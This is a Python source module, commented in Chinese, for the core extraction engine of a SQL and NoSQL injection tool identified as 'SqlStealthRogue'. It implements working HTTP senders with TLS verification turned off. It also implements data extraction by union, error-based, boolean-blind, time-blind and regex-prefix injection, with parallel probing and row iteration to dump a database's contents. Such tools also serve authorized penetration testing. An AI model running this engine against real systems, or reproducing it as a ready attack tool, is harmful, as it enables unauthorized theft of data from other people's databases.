"""提取引擎: 与具体数据库无关, 只含 HTTP 发送 + 提取算法 + 行迭代。

算法与并行度(按流量从少到多):
  union   整个结果集 1 个请求 (regex findall)
  error   每 ~30-60 字符 1 请求 (错误回显分块; fast 版自适应窗口预取)
  bool    每字符 8 请求 (0-255 二分, 真值特征判真; fast 版 8 bit 并行探测)
  time    每字符 8 请求 (响应耗时判真; 刻意串行, 避免目标端并行 SLEEP 过载)
  prefix  每字符 ~7 请求 (正则前缀 + 字符类二分, NoSQL $regex 标配)

并行模型: 行级(ROW 线程) × 值内探测级(PROBE_POOL, 大小 = --bwidth)。
所有探测请求经 PROBE_POOL 收口, 实际 HTTP 并发上限恒等于 bwidth。

占位符约定(由 dbms/ 插件模板使用):
  {Q} 查询  {F} 字段名  {P} 字符位置(1 起)  {N} 块长  {K} 二分比较值
  {T} 延时秒  {M} 位掩码(2^B)  {S} 已提取前缀(PCRE 转义)  {HH} 十六进制字符类上界
"""

import concurrent.futures
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

from . import tampers

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

CHARSET_MIN, CHARSET_MAX = 0x20, 0x7e  # prefix 模式可打印 ASCII 字符集

STATS = {"req": 0}
_lock = threading.Lock()
PROBE_POOL = None

_ALL_ONES = 'ÿ'  # 0xFF: 所有位恒真的典型特征, 真实文本数据不会出现


def _guard_value(out):
    """零额外请求的错误配置哨兵: 值全为 0xFF 说明 --true-mark/判真条件
    匹配了真假两种响应, 继续提取只会产生垃圾流量, 立即中止。"""
    if len(out) >= 4 and all(c == _ALL_ONES for c in out):
        raise ValueError('提取值全为 0xFF: --true-mark/--sec 判真条件疑似恒真, 已中止'
                         '(检查真值特征是否同时匹配真假两种响应)')


def _guard_rows(a):
    """行终止哨兵: 连续多行空值说明「无此行」信号失效(error 正则恒匹配空), 中止。"""
    state = {'empty': 0}

    def note(v):
        if v == '':
            state['empty'] += 1
            if state['empty'] >= 20:
                raise ValueError('连续 20 行空值: 行终止信号疑似失效(error 正则恒匹配?), '
                                 '已中止; 可用 --max-rows/--regex 排查')
        else:
            state['empty'] = 0
    return note


def init_pool(n):
    """初始化探测线程池(值内并发的唯一出口), 必须 shutdown_pool() 收尾。"""
    global PROBE_POOL
    PROBE_POOL = concurrent.futures.ThreadPoolExecutor(max(1, n))


def shutdown_pool():
    if PROBE_POOL:
        PROBE_POOL.shutdown()


class Sender:
    """HTTP 发送器: 默认线程本地 keep-alive 长连接(真实网络下省去每请求 TCP/TLS 握手,
    --no-keepalive 回退 urllib 每请求新建连接)。"""

    def __init__(self, a):
        self.a = a
        self.method = a.method or ('POST' if a.data else 'GET')
        self.headers = {'User-Agent': 'Mozilla/5.0 (SqlStealthRogue)'}
        for h in a.header:
            k, _, v = h.partition(':')
            if v:
                self.headers[k.strip()] = v.strip()
        if a.data and not any(k.lower() == 'content-type' for k in self.headers):
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'
        self.timeout = max(a.timeout, a.sec + 10)
        self.delay = a.delay
        self.keepalive = not getattr(a, 'no_keepalive', False)
        self._local = threading.local()

    def _new_conn(self, url):
        import http.client
        u = urllib.parse.urlsplit(url)
        if u.scheme == 'https':
            return http.client.HTTPSConnection(u.hostname, u.port, timeout=self.timeout, context=SSL_CTX)
        return http.client.HTTPConnection(u.hostname, u.port, timeout=self.timeout)

    def _request_once(self, url, body_bytes):
        """单次 keep-alive 请求(线程本地连接, 断连自动重建交由上层重试)。"""
        import http.client
        c = getattr(self._local, 'conn', None)
        if c is None:
            c = self._new_conn(url)
            self._local.conn = c
        u = urllib.parse.urlsplit(url)
        target = (u.path or '/') + (('?' + u.query) if u.query else '')
        c.request(self.method, target, body=body_bytes, headers=self.headers)
        r = c.getresponse()
        data = r.read()
        if r.will_close or r.version < 11:
            # HTTP/1.0 或服务端要求断连: 长连接无收益, 后续自动降级 urllib
            c.close()
            self._local.conn = None
            if r.version < 11:
                self.keepalive = False
        return r.status, data, r.getheader('Location') or ''

    def _send_keepalive(self, url, body_bytes):
        status, data, loc = None, None, None
        for _ in range(2):
            try:
                status, data, loc = self._request_once(url, body_bytes)
                break
            except Exception:
                c = getattr(self._local, 'conn', None)
                if c is not None:
                    try:
                        c.close()
                    except Exception:
                        pass
                self._local.conn = None
        if status is None:
            raise ConnectionError('keep-alive 两次尝试均失败: %s' % url)
        hops = 0
        while status in (301, 302, 303, 307, 308) and loc and hops < 3:
            hops += 1
            nxt = urllib.parse.urljoin(url, loc)
            self._local.conn = None
            status, data, loc = self._request_once(nxt, body_bytes)
        return data

    def _send_urllib(self, url, body_bytes):
        req = urllib.request.Request(url, data=body_bytes, headers=self.headers, method=self.method)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=SSL_CTX) as r:
                return r.read()
        except urllib.error.HTTPError as e:  # 报错常就在错误页里
            return e.read()

    def send(self, payload):
        """发一个请求, 返回 (响应体, 耗时秒)。注入点 = 模板里 * 处。
        --err-mark: 命中错误页特征的响应视为无效探针, 重试一次, 仍错则失败——
        防止后端错误被静默当作假值污染提取结果。"""
        a = self.a
        if a.verbose:
            with _lock:
                print('[>] %s' % payload, file=sys.stderr)
        chain = getattr(a, 'tamper_chain', None)
        if chain:
            enc = tampers.wire_encode(tampers.apply(chain, payload, self.headers))
        elif a.raw:
            enc = payload
        else:
            enc = urllib.parse.quote(payload, safe='')
        url = a.url.replace('*', enc, 1)
        data = a.data.replace('*', enc, 1) if a.data else None
        body_bytes = data.encode() if data else None
        t0 = time.time()
        err_page_rx = getattr(a, 'err_page_rx', None)
        attempts = 3 if err_page_rx else 2
        err = None
        body = None
        for i in range(attempts):
            try:
                if self.keepalive:
                    body = self._send_keepalive(url, body_bytes)
                else:
                    body = self._send_urllib(url, body_bytes)
                if err_page_rx and err_page_rx.search(body.decode('utf-8', 'replace')) \
                        and i < attempts - 1:
                    time.sleep(0.3)
                    continue
                break
            except Exception as e:
                err = e
                if not self.keepalive:
                    time.sleep(0.5)
        if body is None:
            raise err
        if self.delay:
            time.sleep(self.delay)
        with _lock:
            STATS['req'] += 1
        return body.decode('utf-8', 'replace'), time.time() - t0


def err_scalar(s, q, a):
    """报错模式提取一个标量; 无特征 => 子查询为 NULL => 行终止。"""
    out, pos = [], 1
    while pos <= a.maxlen:
        body, _ = s.send(a.err_tpl.replace('{Q}', q).replace('{F}', q or '')
                         .replace('{P}', str(pos)).replace('{N}', str(a.chunk)))
        m = a.rx.search(body)
        if not m:
            return ''.join(out) if out else None
        piece = m.group(1)
        if a.err_strip:
            piece = piece[:-a.err_strip] if len(piece) > a.err_strip else ''
        out.append(piece)
        if len(piece) < a.chunk:  # 短读 => 值已取完
            return ''.join(out)
        pos += a.chunk
    return ''.join(out)


def fast_err_scalar(s, q, a):
    """报错模式(快版): 分块预取 — 块位置固定可投机, 自适应窗口(1,2,4..bwidth)
    并行预取后续块, 短读/空块即止; 长值场景用少量冗余请求换批次延迟。"""
    out = []
    base, width = 1, 1
    while base <= a.maxlen:
        futs = [PROBE_POOL.submit(
                    s.send,
                    a.err_tpl.replace('{Q}', q)
                             .replace('{P}', str(base + i * a.chunk))
                             .replace('{N}', str(a.chunk)))
                for i in range(width)]
        stop = False
        for i, f in enumerate(futs):
            m = a.rx.search(f.result()[0])
            if not m:
                if not out and i == 0:
                    return None  # 行不存在(子查询 NULL)
                stop = True
                break
            piece = m.group(1)
            if a.err_strip:
                piece = piece[:-a.err_strip] if len(piece) > a.err_strip else ''
            out.append(piece)
            if len(piece) < a.chunk:  # 短读 => 值已取完
                stop = True
                break
        if stop:
            return ''.join(out) if out else None
        base += width * a.chunk
        width = min(width * 2, a.bwidth)
    return ''.join(out)


def blind_scalar(s, q, a):
    """布尔盲注(串行版): 每字符在 [0,255] 二分(8 请求), 收敛到 0 即串结束。"""
    out = []
    for pos in range(1, a.maxlen + 1):
        lo, hi = 0, 255
        while lo < hi:
            mid = (lo + hi) // 2
            body, _ = s.send(a.bool_tpl.replace('{Q}', q).replace('{F}', q or '')
                             .replace('{P}', str(pos)).replace('{K}', str(mid)))
            if a.trx.search(body):
                lo = mid + 1
            else:
                hi = mid
        if lo == 0:
            return ''.join(out) if out else None
        out.append(chr(lo))
        _guard_value(out)
    return ''.join(out)


def fast_bool_scalar(s, q, a):
    """布尔盲注(快版): 位并行提取 — bit_tpl 实现「char(P) & {M} > 0」语义。
    8 个 bit 探测互相独立、位置间无依赖, 按窗口批量并发; 请求数与串行版相同,
    关键路径从 len×8 次串行往返塌缩为 len/W 个批次往返。
    串结束 = 8 bit 全 0(文本不含 NUL; 二进制数据请用 error/union)。"""
    width = max(1, a.bwidth // 8)
    out = []
    pos = 1
    while pos <= a.maxlen:
        futs = {}
        for pi in range(width):
            p = pos + pi
            for b in range(8):
                payload = (a.bit_tpl.replace('{Q}', q).replace('{F}', q or '')
                           .replace('{P}', str(p)).replace('{M}', str(1 << b)))
                futs[(p, b)] = PROBE_POOL.submit(s.send, payload)
        stop = False
        for pi in range(width):
            p = pos + pi
            code = 0
            for b in range(8):
                body, _ = futs[(p, b)].result()
                if a.trx.search(body):
                    code |= 1 << b
            if code == 0:
                stop = True
                break
            out.append(chr(code))
            _guard_value(out)
        if stop:
            return ''.join(out) if out else None
        pos += width
    return ''.join(out)


def time_scalar(s, q, a):
    """时间盲注: 响应耗时 >= --sec 的 3/4 判真(留 1/4 容忍后端解析抖动), 二分同布尔。"""
    out = []
    thr = a.sec * 0.75
    for pos in range(1, a.maxlen + 1):
        lo, hi = 0, 255
        while lo < hi:
            mid = (lo + hi) // 2
            _, el = s.send(a.time_tpl.replace('{Q}', q).replace('{F}', q or '')
                           .replace('{P}', str(pos)).replace('{K}', str(mid))
                           .replace('{T}', str(a.sec)))
            if el >= thr:
                lo = mid + 1
            else:
                hi = mid
        if lo == 0:
            return ''.join(out) if out else None
        out.append(chr(lo))
        _guard_value(out)
    return ''.join(out)


def pcre_escape(text):
    """PCRE 安全转义: 非字母数字一律加反斜杠(用于 prefix 模式前缀)。"""
    return re.sub(r'([^0-9A-Za-z])', r'\\\1', text)


def prefix_scalar(s, a):
    """正则前缀提取(NoSQL $regex 标配): 模板实现「值匹配 ^{S}[\\x20-\\x{HH}]」语义,
    对第 P 个字符在可打印 ASCII 上二分。要求字符存在, 天然处理串结束。
    (注意: HH 不可低于 0x20, 反向区间 [\x20-\x1f] 在 PCRE 中行为未定义。)"""
    def pred(pre, hh):
        body, _ = s.send(a.prefix_tpl
                         .replace('{F}', a.query or '')
                         .replace('{S}', pcre_escape(pre))
                         .replace('{P}', str(len(pre) + 1))
                         .replace('{HH}', '%02x' % hh))
        return bool(a.trx.search(body))

    out = ''
    while len(out) < a.maxlen:
        if not pred(out, CHARSET_MAX):  # 该位置无可打印字符 => 串结束
            return out or None
        lo, hi = CHARSET_MIN, CHARSET_MAX
        while lo < hi:
            mid = (lo + hi) // 2
            if pred(out, mid):
                hi = mid
            else:
                lo = mid + 1
        out += chr(lo)
        if len(out) >= 32 and set(out) == {' '}:
            raise ValueError('提取值全为空格: --true-mark 疑似恒真(真假响应都匹配), 已中止')
    return out


def union_dump(s, q, a):
    """UNION 模式: 整个结果集 1 个请求, --regex findall, 每个匹配 = 一行。"""
    body, _ = s.send(a.union_tpl.replace('{Q}', q or '')
                     .replace('{F}', q or ''))
    return [m.group(1) for m in a.rx.finditer(body)]


def run_rows(a, scalar):
    wrap = a.db.get('row_wrap')
    if a.single or wrap is None:
        v = scalar(a.query)
        return [v] if v is not None else []
    manual = '{R}' in a.query
    rows, stop = {}, threading.Event()
    note = _guard_rows(a)

    def work(r):
        if stop.is_set():
            return
        q = (a.query.replace('{R}', str(r)) if manual
             else wrap.replace('{Q}', a.query).replace('{R}', str(r)))
        try:
            v = scalar(q)
        except Exception:
            stop.set()
            raise
        if v is None:  # 取空 => 后续行号均不存在
            stop.set()
            return
        note(v)
        rows[r] = v
        with _lock:
            print('[+] row %d: %s' % (r, v[:60] + ('...' if len(v) > 60 else '')),
                  file=sys.stderr)

    with concurrent.futures.ThreadPoolExecutor(max(a.threads, 1)) as ex:
        list(ex.map(work, range(a.max_rows)))
    return [rows[r] for r in sorted(rows)]
